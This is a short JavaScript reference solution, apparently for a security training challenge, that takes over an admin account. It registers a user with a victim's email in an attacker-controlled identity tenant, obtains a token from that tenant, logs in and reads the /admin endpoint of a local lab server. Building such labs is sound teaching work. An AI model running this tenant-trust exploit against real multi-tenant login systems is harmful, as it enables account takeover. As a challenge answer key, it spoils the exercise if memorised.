// Reference solution for challenge 1. Spoilers. Run: node solutions/tenant-trust.mjs [baseUrl]
const base = process.argv[2] ?? 'http://localhost:4101';
const post = (p, b) => fetch(base + p, { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify(b) }).then((r) => r.json());
export async function solve(baseUrl = base) {
  const p = (path, b) => fetch(baseUrl + path, { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify(b) }).then((r) => r.json());
  await p('/idp/evil/users', { username: 'mallory', email: 'admin@contoso.test' }); // my tenant, my email claim
  const { id_token } = await p('/idp/evil/token', { username: 'mallory' });
  const { session } = await p('/login', { id_token });
  const r = await fetch(baseUrl + '/admin', { headers: { 'x-session': session } });
  return r.json();
}
if (import.meta.url === `file://${process.argv[1]}`) console.log(await solve());
